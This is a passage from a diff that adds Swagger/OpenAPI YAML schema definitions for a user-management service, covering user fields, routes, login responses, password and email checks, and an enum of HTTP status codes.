+      lastModifiedBy:
+        type: string
+      lastModifiedDate:
+        type: string
+        format: date-time
+      lastName:
+        type: string
+        minLength: 0
+        maxLength: 50
+      login:
+        type: string
+        minLength: 1
+        maxLength: 50
+        pattern: "^[_'.@A-Za-z0-9-]*$"
+      password:
+        type: string
+        minLength: 4
+        maxLength: 100
+      resetKey:
+        type: string
+      roleList:
+        type: array
+        items:
+          type: integer
+          format: int64
+      roles:
+        type: array
+        items:
+          type: string
+  RouteVM:
+    type: object
+    properties:
+      path:
+        type: string
+      serviceId:
+        type: string
+      serviceInstances:
+        type: array
+        items:
+          "$ref": "#/definitions/ServiceInstance"
+  SimpleGrantedAuthority:
+    type: object
+    properties:
+      authority:
+        type: string
+  ResponseEntity:
+    type: object
+    properties:
+      body:
+        type: object
+      statusCode:
+        type: string
+        enum:
+        - '100'
+        - '101'
+        - '102'
+        - '103'
+        - '200'
+        - '201'
+        - '202'
+        - '203'
+        - '204'
+        - '205'
+        - '206'
+        - '207'
+        - '208'
+        - '226'
+        - '300'
+        - '301'
+        - '302'
+        - '303'
+        - '304'
+        - '305'
+        - '307'
+        - '308'
+        - '400'
+        - '401'
+        - '402'
+        - '403'
+        - '404'
+        - '405'
+        - '406'
+        - '407'
+        - '408'
+        - '409'
+        - '410'
+        - '411'
+        - '412'
+        - '413'
+        - '414'
+        - '415'
+        - '416'
+        - '417'
+        - '418'
+        - '419'
+        - '420'
+        - '421'
+        - '422'
+        - '423'
+        - '424'
+        - '426'
+        - '428'
+        - '429'
+        - '431'
+        - '451'
+        - '500'
+        - '501'
+        - '502'
+        - '503'
+        - '504'
+        - '505'
+        - '506'
+        - '507'
+        - '508'
+        - '509'
+        - '510'
+        - '511'
+      statusCodeValue:
+        type: integer
+        format: int32
+  PasswordCheckVM:
+    type: object
+    properties:
+      newPassword:
+        type: string
+      oldPassword:
+        type: string
+  AuthorityDTO:
+    type: object
+    properties:
+      id:
+        type: integer
+        format: int64
+      name:
+        type: string
+  LoginResponseVM:
+    type: object
+    properties:
+      authorities:
+        type: array
+        items:
+          "$ref": "#/definitions/SimpleGrantedAuthority"
+      userId:
+        type: integer
+        format: int64
+      userLogin:
+        type: string
+  EmailCheckVM:
+    type: object
+    properties:
+      email:
+        type: string
+      error:
+        type: string
+      message:
+        type: string
+      originalEmail:
+        type: string
+      password:
+        type: string
